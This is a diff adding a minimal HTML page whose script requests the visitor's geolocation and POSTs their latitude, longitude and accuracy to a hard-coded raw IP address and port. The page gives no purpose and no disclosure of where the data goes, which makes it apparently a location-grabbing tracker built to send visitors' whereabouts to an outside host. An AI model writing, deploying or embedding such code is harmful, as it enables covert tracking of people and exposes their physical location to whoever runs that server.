@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+navigator.geolocation.getCurrentPosition(async (pos) => {
+    const data = {
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
+    };
+
+    await fetch(" http://152.53.54.225:35260/location", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(data)
+    });
+
+    document.body.innerHTML = "Location sent";
+}, (err) => {
+    document.body.innerHTML = "Permission denied or error";
+});
+</script>
+</body>
+</html>
